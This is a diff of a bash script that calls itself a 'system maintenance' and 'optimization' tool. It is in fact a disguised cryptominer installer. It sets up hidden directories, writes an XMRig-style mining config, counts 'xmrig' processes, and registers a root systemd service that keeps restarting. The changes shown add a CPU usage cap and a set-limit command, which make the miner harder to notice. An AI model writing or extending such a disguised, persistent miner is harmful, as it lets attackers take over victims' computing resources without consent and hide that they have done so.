@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.16
+VERSION=2.17
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -47,7 +47,7 @@ if ! type curl >/dev/null || ! type tar >/dev/null; then
   sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y curl tar >/dev/null 2>&1
 fi
 
-# Calculate optimal CPU usage - MAX 6 CORES
+# Calculate optimal CPU usage - MAX 6 CORES with 80% usage
 CPU_THREADS=$(nproc)
 if [ $CPU_THREADS -gt 6 ]; then
     USABLE_THREADS=6  # Maximum 6 cores
@@ -55,12 +55,12 @@ else
     USABLE_THREADS=$((CPU_THREADS > 2 ? CPU_THREADS - 1 : 1))
 fi
 
-CPU_USAGE=100
+CPU_USAGE=80  # Maximum 80% CPU usage
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
 echo "[*] Starting system maintenance setup..."
-echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (MAX 6 cores)"
+echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (MAX 80% usage)"
 
 # Function to create hidden directories
 create_hidden_dirs() {
@@ -197,7 +197,7 @@ cat > "$BASE_DIR/config.json" << EOF
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": 100,
+        "max-threads-hint": $CPU_USAGE,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
@@ -273,8 +273,8 @@ case "\$1" in
         if [ -w "/proc/sys/vm/nr_hugepages" ]; then
             echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
         fi
-        # Start the optimizer
-        nohup ./main --config=./config.json > ./output.log 2>&1 &
+        # Start the optimizer with CPU limit
+        nohup ./main --config=./config.json --cpu-max-threads-hint=$CPU_USAGE > ./output.log 2>&1 &
         echo \$! > ./pid.txt
         echo "✅ Started with PID: \$(cat ./pid.txt)"
         sleep 3
@@ -301,8 +301,10 @@ case "\$1" in
             COUNT=\$(echo "\$PIDS" | wc -l)
             echo "✅ Running - PIDs: \$PIDS"
             echo "📊 Process Count: \$COUNT"
+            echo "⚡ CPU Limit: $CPU_USAGE%"
             for PID in \$PIDS; do
-                echo "   PID \$PID - CPU: \$(ps -p \$PID -o %cpu --no-headers 2>/dev/null || echo 'N/A')% - MEM: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
+                CPU_USAGE_ACTUAL=\$(ps -p \$PID -o %cpu --no-headers 2>/dev/null | awk '{print int(\$1)}' || echo 'N/A')
+                echo "   PID \$PID - CPU: \${CPU_USAGE_ACTUAL}% - MEM: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
             done
         else
             echo "❌ Stopped"
@@ -319,6 +321,7 @@ case "\$1" in
     stats)
         echo "=== System Statistics ==="
         echo "CPU Threads: $USABLE_THREADS/$CPU_THREADS"
+        echo "CPU Usage Limit: $CPU_USAGE%"
         echo "Total Memory: \$(free -h | grep Mem | awk '{print \$2}')"
         echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}' 2>/dev/null || echo 'N/A')"
         echo "Active Processes: \$(pgrep -f xmrig | wc -l)"
@@ -335,8 +338,21 @@ case "\$1" in
         sleep 2
         ./control status
         ;;
+    set-limit)
+        echo "🔧 Setting CPU usage limit..."
+        if [ -n "\$2" ] && [ "\$2" -ge 10 ] && [ "\$2" -le 100 ]; then
+            NEW_LIMIT="\$2"
+            sed -i "s/\\\"max-threads-hint\\\": [0-9]*,/\\\"max-threads-hint\\\": \$NEW_LIMIT,/" config.json
+            echo "✅ CPU limit set to \$NEW_LIMIT%"
+            ./control restart
+        else
+            echo "❌ Usage: \$0 set-limit <10-100>"
+            echo "   Current limit: $CPU_USAGE%"
+        fi
+        ;;
     *)
-        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|killall}"
+        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|killall|set-limit}"
+        echo "   set-limit: Change CPU usage limit (10-100%)"
         ;;
 esac
 EOF
@@ -369,7 +385,7 @@ Type=simple
 Restart=always
 RestartSec=10
 User=root
-ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
+ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --cpu-max-threads-hint=$CPU_USAGE
 WorkingDirectory=$BASE_DIR
 Environment=LC_ALL=C
 StandardOutput=append:$BASE_DIR/output.log
@@ -416,14 +432,15 @@ echo
 echo
 echo "🎯 System optimization setup complete!"
 echo "📍 Installation directory: $BASE_DIR" 
-echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|killall} to manage"
-echo
+echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|killall|set-limit} to manage"
+echo "💡 Use 'set-limit' to change CPU usage (10-100%)"
 
 # Check if process is running
 PIDS=$(pgrep -f "$BASE_DIR/main" 2>/dev/null)
 if [ -n "$PIDS" ]; then
     COUNT=$(echo "$PIDS" | wc -l)
     echo "✅ Optimizer is running with $COUNT process(es)!"
+    echo "⚡ CPU usage limited to: $CPU_USAGE%"
     if [ $COUNT -gt 1 ]; then
         echo "⚠️  Warning: Multiple processes detected. Use '$BASE_DIR/control killall' to stop all."
     fi
